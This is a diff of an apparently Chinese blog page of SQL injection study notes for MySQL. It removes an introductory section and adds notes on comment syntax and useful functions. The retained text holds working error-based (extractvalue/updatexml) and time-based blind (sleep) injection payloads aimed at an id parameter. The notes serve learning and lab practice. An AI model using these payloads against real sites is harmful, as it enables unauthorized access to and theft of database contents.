@@ -57,47 +57,7 @@
         <div id="article">
     <div class="toc"></div>
     <div class="article-body">
-        <h1 id="数据库注入"><a href="#数据库注入" class="headerlink" title="数据库注入"></a>数据库注入</h1><ol>
-<li>明确注入数据库类型，权限</li>
-<li>明确提交方法，参数类型等</li>
-<li>明确数据库记录信息系统表</li>
-<li>依次库、表、列、值注入查询</li>
-<li>找后台，登录，获取shell（可能失败）</li>
-<li>有高权限的话尝试，文件读写/命令执行/注册表读取等</li>
-</ol>
-<h1 id="sql注入介绍"><a href="#sql注入介绍" class="headerlink" title="sql注入介绍"></a>sql注入介绍</h1><ol>
-<li>sql注入在安全问题中排行榜首</li>
-<li>sql注入攻击是输入参数未经过过滤，然后直接拼接到SQL语句当中解析</li>
-<li>sql注入是一种将sql代码添加到输入参数中，传递到服务器解析并执行的一种攻击手法</li>
-</ol>
-<h1 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h1><ol>
-<li>提交恶意代码</li>
-<li>后台未过滤或过滤不足</li>
-<li>获取数据库的敏感信息</li>
-</ol>
-<h1 id="sql注入实现方式"><a href="#sql注入实现方式" class="headerlink" title="sql注入实现方式"></a>sql注入实现方式</h1><ol>
-<li>手动注入</li>
-<li>自动注入（工具）</li>
-</ol>
-<h1 id="数据库的基本操作"><a href="#数据库的基本操作" class="headerlink" title="数据库的基本操作"></a>数据库的基本操作</h1><p>语句：</p>
-<ol>
-<li>查看所有的数据库：show databases;</li>
-<li>使用库:use dvwa;</li>
-<li>查看默认库：select database();当前连接的数据库</li>
-<li>查看所有表：show tables;</li>
-<li>查看表结构: desc表；</li>
-<li>查看创建sql语句：show create table users\G; (G:表示字段以行方式显示)</li>
-<li>查看当前默认用户：select user();</li>
-<li>查看版本： select cersion();</li>
-</ol>
-<h1 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h1><ol>
-<li>查询所有字段：select * from users;</li>
-<li>查询指定字段：select user,password from users;</li>
-<li>条件查询：select * from users where user = ‘admin’</li>
-<li>逻辑与： select * from users where user = ‘admin’ and user_id=6</li>
-<li>逻辑或： select * from users where user = ‘admin’ or user_id=6</li>
-</ol>
-<h1 id="特殊库介绍"><a href="#特殊库介绍" class="headerlink" title="特殊库介绍"></a>特殊库介绍</h1><p>库名：information_schema<br>作用：存储mysql中的所有库名，表名，列名，是mysql数据的字典<br>tables表：记录mysql库中所有的表<br>columns表：记录mysql库中所有的表和列</p>
+        <h1 id="特殊库介绍"><a href="#特殊库介绍" class="headerlink" title="特殊库介绍"></a>特殊库介绍</h1><p>库名：information_schema<br>作用：存储mysql中的所有库名，表名，列名，是mysql数据的字典<br>tables表：记录mysql库中所有的表<br>columns表：记录mysql库中所有的表和列</p>
 <h1 id="特殊操作"><a href="#特殊操作" class="headerlink" title="特殊操作"></a>特殊操作</h1><p>查看表</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from information_schema.tables\G;</span><br><span class="line">select * from information_schema.columns\G;</span><br></pre></td></tr></table></figure>
 <p>关注字段</p>
@@ -168,6 +128,11 @@
 <h2 id="XPATH-报错"><a href="#XPATH-报错" class="headerlink" title="XPATH 报错"></a>XPATH 报错</h2><p>@extractalue( )<br>[?id=33 and extractvalue(1,concat(‘^’,(select version()),’^))–+]<br>@ updatexml()<br>[?id=33 and updatexml(1,concat(‘’,(select database()),),1)–+]</p>
 <h1 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>利用sleep（）语句的延时性，以时间线作为判断条件。</p>
 <h2 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h2><p>@获取数据库名长度<br>[?id=33 and if((Length(database())=3),sleep(5),1)–+]<br>@ 数据库名第二位<br>[?id=33 and if((ascii(substr(database(),2,1))=109),sleep(5),1)–+]<br>由此可知，数据库名第二个字母的ASCII 码值为109，即是字母m。</p>
+<h1 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h1><p>mysql数据库的注释大概有以下几种</p>
+<p>– （杠杠空格）<br>/* …… */<br>/*！…….. */ 内联查询</p>
+<h1 id="mysql元数据库数据库information-schema"><a href="#mysql元数据库数据库information-schema" class="headerlink" title="mysql元数据库数据库information_schema"></a>mysql元数据库数据库information_schema</h1><p><img src="/image/sql1.png" alt="图片"></p>
+<h1 id="Mysql常用函数与参数"><a href="#Mysql常用函数与参数" class="headerlink" title="Mysql常用函数与参数"></a>Mysql常用函数与参数</h1><p>= | &gt; | &gt;= | &lt;= | &lt;&gt;  比较运算符<br>and | or             逻辑运算符<br>version()                mysql数据库版本<br>database()            当前数据库名<br>user()                用户名<br>current_user()         当前用户名<br>System_user()            系统用户名<br>@@datadir            数据库路径<br>@@version_compile_os     操作系统版本<br>Length()                返回字符串的长度<br>Substring()            截取字符串<br>Substr()        substr()与mid()相同，都为截取字符串<br>Mid()     1、截取字符串 2、截取起始位置，从1开始计数  3、截取长度<br>举例：mid(‘hello’,1,3)，从第1位开始截取3位，输出位hel<br>Left()<br>Char()        解ASCII码<br>Replace()<br>语法<br>REPLACE(string_expression,,string_pattern,string_replacement )<br>参数<br>string_expression 要搜索的字符串表达式。string_expression 可以是字符或二进制数据类型。<br>string_pattern 是要查找的子字符串。string_pattern 可以是字符或二进制数据类型。string_pattern不能是空字符串 （”）。<br>string_replacement 替换字符串。string_replacement 可以是字符或二进制数据类型。</p>
+<p>Left()        从左侧开始取指定字符个数的字符串<br>concat()        没有分隔符的连接字符串<br>concat_ws()        含有分割符的连接字符串<br>group_conat()        连接一个组的字符串<br>ord( )            返回ASCII 码<br>ascii()<br>hex()            将字符串转换为十六进制<br>unhex()            hex 的反向操作<br>md5( )             返回MD5 值<br>floor(x)            返回不大于x 的最大整数<br>round( )            返回参数x 接近的整数<br>rand()            返回0-1 之间的随机浮点数<br>load_file()        读取文件，并返回文件内容作为一个字符串<br>s leep()            睡眠时间为指定的秒数<br>if(true,t,f)        if 判断<br>count()        计算查询结果的行数<br>find_in_set()        返回字符串在字符串列表中的位置<br>benchmark()        指定语句执行的次数<br>name_const ()        返回表作为结果 </p>
 
         <p class="suffix-end">__END__</p>
         <div class="suffix-box">
